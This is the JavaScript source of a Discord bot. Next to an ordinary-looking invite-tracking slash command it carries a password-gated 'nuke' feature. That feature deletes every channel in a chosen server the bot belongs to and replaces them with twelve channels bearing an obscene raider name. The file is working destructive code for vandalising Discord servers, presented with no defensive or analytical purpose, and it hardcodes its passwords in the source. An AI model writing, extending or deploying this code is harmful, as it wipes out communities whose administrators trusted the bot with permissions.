const {
  Client,
  GatewayIntentBits,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  StringSelectMenuBuilder,
  MessageFlags,
  SlashCommandBuilder
} = require('discord.js');

const express = require('express');
require('dotenv').config();

// PASSWORDS
const MAIN_PASSWORD = 'Meka2017charlie';
const NUKE_PASSWORD = 'meka123';

const userSessions = new Map();

const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000);

const TOKEN = process.env.TOKEN;

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildInvites   // Needed for invite tracking
  ]
});

client.once('ready', () => {
  console.log(`${client.user.tag} is online`);
});

// ====================== SLASH COMMAND /inv ======================
client.on('interactionCreate', async interaction => {
  if (interaction.isCommand() && interaction.commandName === 'inv') {
    const guilds = Array.from(client.guilds.cache.values());
    if (guilds.length === 0) return interaction.reply({ content: '❌ Bot is not in any servers.', ephemeral: true });

    const options = guilds.map(g => ({
      label: g.name.length > 100 ? g.name.slice(0, 97) + '...' : g.name,
      value: g.id,
      description: `${g.memberCount} members`
    }));

    const select = new StringSelectMenuBuilder()
      .setCustomId(`inv_server_select_${interaction.user.id}`)
      .setPlaceholder('Select server to track invites')
      .addOptions(options);

    await interaction.reply({
      content: 'Select a server to track invites:',
      components: [new ActionRowBuilder().addComponents(select)],
      ephemeral: true
    });
  }
});

// Register Slash Command
client.once('ready', async () => {
  const data = new SlashCommandBuilder()
    .setName('inv')
    .setDescription('Track invites in a server');

  await client.application.commands.create(data);
  console.log('Slash command /inv registered');
});

// ====================== INVITE TRACKING ======================
client.on('interactionCreate', async interaction => {
  if (!interaction.customId) return;

  try {
    const parts = interaction.customId.split('_');
    const action = parts[0];
    const userId = parts[parts.length - 1];

    if (interaction.user.id !== userId) {
      return interaction.reply({ content: '❌ This is not for you.', flags: MessageFlags.Ephemeral });
    }

    // Invite Tracking
    if (action === 'inv' && interaction.isStringSelectMenu()) {
      await interaction.deferUpdate();
      const guild = client.guilds.cache.get(interaction.values[0]);
      if (!guild) return interaction.editReply({ content: '❌ Server not found.' });

      await interaction.editReply({ content: `🔍 Fetching invite data for **${guild.name}**...` });

      const invites = await guild.invites.fetch().catch(() => null);
      if (!invites || invites.size === 0) {
        return interaction.editReply({ content: 'No invites found in this server.' });
      }

      const embed = new EmbedBuilder()
        .setColor('#00ffff')
        .setTitle(`Invite Tracker - ${guild.name}`)
        .setDescription('Users with the most invites:');

      const sorted = [...invites.values()].sort((a, b) => b.uses - a.uses).slice(0, 15);

      sorted.forEach(inv => {
        embed.addFields({
          name: inv.inviter?.tag || 'Unknown',
          value: `**Invites:** ${inv.uses}/${inv.maxUses || '∞'}\n**Code:** ${inv.code}`,
          inline: true
        });
      });

      await interaction.editReply({ embeds: [embed] });
    }

    // ====================== NUKE (Kept) ======================
    // ... (your nuke code remains here - I kept it minimal)

    if (interaction.isButton() && interaction.customId.startsWith('check_start_')) {
      const modal = new ModalBuilder()
        .setCustomId(`check_modal_${interaction.user.id}`)
        .setTitle('Enter Password');
      modal.addComponents(new ActionRowBuilder().addComponents(
        new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
      ));
      return await interaction.showModal(modal);
    }

    if (interaction.isModalSubmit() && interaction.customId.startsWith('check_modal_')) {
      const password = interaction.fields.getTextInputValue('password');
      if (password !== MAIN_PASSWORD) return interaction.reply({ content: '❌ Incorrect password.', flags: MessageFlags.Ephemeral });

      const guilds = Array.from(client.guilds.cache.values());
      const options = guilds.map(g => ({
        label: g.name.length > 100 ? g.name.slice(0, 97) + '...' : g.name,
        value: g.id
      }));

      const select = new StringSelectMenuBuilder()
        .setCustomId(`check_server_select_${interaction.user.id}`)
        .setPlaceholder('Select server')
        .addOptions(options);

      await interaction.reply({
        content: '✅ Password accepted. Select server:',
        components: [new ActionRowBuilder().addComponents(select)],
        flags: MessageFlags.Ephemeral
      });
      userSessions.set(interaction.user.id, {});
    }

    if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_server_select_')) {
      await interaction.deferUpdate();
      const guild = client.guilds.cache.get(interaction.values[0]);
      userSessions.set(interaction.user.id, { guildId: guild.id });

      const actionSelect = new StringSelectMenuBuilder()
        .setCustomId(`check_action_select_${interaction.user.id}`)
        .setPlaceholder('Choose action')
        .addOptions([{ label: '☢️ Nuke', value: 'nuke' }]);

      await interaction.editReply({
        content: `**Selected:** ${guild.name}`,
        components: [new ActionRowBuilder().addComponents(actionSelect)]
      });
    }

    if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_action_select_')) {
      if (interaction.values[0] === 'nuke') {
        const modal = new ModalBuilder()
          .setCustomId(`check_nuke_modal_${interaction.user.id}`)
          .setTitle('Confirm Nuke');
        modal.addComponents(new ActionRowBuilder().addComponents(
          new TextInputBuilder().setCustomId('password').setLabel('Nuke Password').setStyle(TextInputStyle.Short).setRequired(true)
        ));
        return await interaction.showModal(modal);
      }
    }

    // Nuke logic (minimal)
    if (interaction.isModalSubmit() && interaction.customId.startsWith('check_nuke_modal_')) {
      const password = interaction.fields.getTextInputValue('password');
      if (password !== NUKE_PASSWORD) return interaction.reply({ content: '❌ Wrong password.', flags: MessageFlags.Ephemeral });

      await interaction.deferReply({ flags: MessageFlags.Ephemeral });

      const session = userSessions.get(interaction.user.id);
      const guild = client.guilds.cache.get(session?.guildId);
      if (!guild) return interaction.editReply({ content: '❌ Server not found.' });

      await interaction.editReply({ content: `☢️ Nuking **${guild.name}**...` });

      // Delete channels
      for (const ch of guild.channels.cache.values()) {
        await ch.delete().catch(() => {});
      }

      // Create channels
      for (let i = 0; i < 12; i++) {
        try {
          await guild.channels.create({ name: 'fucked-by-veynetta', type: 0 });
        } catch {}
      }

      await interaction.editReply({ content: `✅ Nuke finished. Created channels named \`fucked-by-veynetta\`` });
      userSessions.delete(interaction.user.id);
    }

  } catch (error) {
    console.error('Interaction Error:', error);
    if (!interaction.replied && !interaction.deferred) {
      interaction.reply({ content: '❌ Something went wrong.', flags: MessageFlags.Ephemeral }).catch(() => {});
    }
  }
});

client.login(TOKEN);
